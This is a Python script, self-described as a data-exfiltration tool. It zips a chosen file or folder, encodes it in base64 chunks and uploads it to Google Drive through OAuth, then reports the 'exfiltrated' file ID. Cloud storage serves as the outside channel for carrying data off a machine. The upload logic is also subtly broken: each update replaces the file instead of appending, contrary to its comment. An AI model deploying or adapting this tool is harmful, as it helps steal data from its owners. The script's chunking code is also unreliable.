import os
import base64
import io
import zipfile
import argparse
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request

# If modifying these SCOPES, delete the file token.json.
SCOPES = ['https://www.googleapis.com/auth/drive.file']

def authenticate():
    """Authenticate the Google Drive API."""
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token.json', 'w') as token:
            token.write(creds.to_json())
    return creds

def upload_chunked_data(service, filename, data_chunks):
    """Uploads Base64-encoded chunks to Google Drive."""
    # Create an empty file in Google Drive
    file_metadata = {'name': filename}
    media = MediaIoBaseUpload(io.BytesIO(), mimetype='application/octet-stream')
    
    file = service.files().create(body=file_metadata, media_body=media).execute()
    file_id = file.get('id')

    # Upload indexed chunks
    for index, chunk in enumerate(data_chunks, start=1):
        indexed_chunk = f"Chunk {index}: {chunk}"
        media = MediaIoBaseUpload(io.BytesIO(indexed_chunk.encode()), mimetype='text/plain')
        # Update the file by appending chunks
        service.files().update(fileId=file_id, media_body=media).execute()

    print(f"Data exfiltrated to file ID: {file_id}")

def read_and_chunk_data(file_path):
    """Read data from a file and break it into 1KB Base64-encoded chunks."""
    with open(file_path, 'rb') as file:
        while True:
            chunk = file.read(1024)  # Read 1KB at a time
            if not chunk:
                break
            # Encode the chunk into Base64
            encoded_chunk = base64.b64encode(chunk).decode('utf-8')
            yield encoded_chunk

def zip_folder(folder_path):
    """Compress a folder into a zip archive."""
    zip_filename = f"{folder_path}.zip"
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))
    return zip_filename

def main():
    # Argument parsing to select file, folder, or zip
    parser = argparse.ArgumentParser(description="Exfiltrate data to Google Drive.")
    parser.add_argument('--file', help="File to exfiltrate", required=False)
    parser.add_argument('--folder', help="Folder to exfiltrate (will be zipped)", required=False)
    parser.add_argument('--zip', help="Zip archive to exfiltrate", required=False)
    args = parser.parse_args()

    if args.file:
        file_path = args.file
    elif args.folder:
        # Zip the folder before exfiltrating
        file_path = zip_folder(args.folder)
        print(f"Folder zipped into {file_path}")
    elif args.zip:
        file_path = args.zip
    else:
        print("Please provide a file, folder, or zip archive.")
        return

    # Authenticate with Google Drive
    creds = authenticate()
    service = build('drive', 'v3', credentials=creds)

    # Chunk the file into Base64 1KB chunks
    data_chunks = read_and_chunk_data(file_path)

    # Upload the chunks to Google Drive, indexed by chunk number
    upload_chunked_data(service, os.path.basename(file_path), data_chunks)

if __name__ == '__main__':
    main()
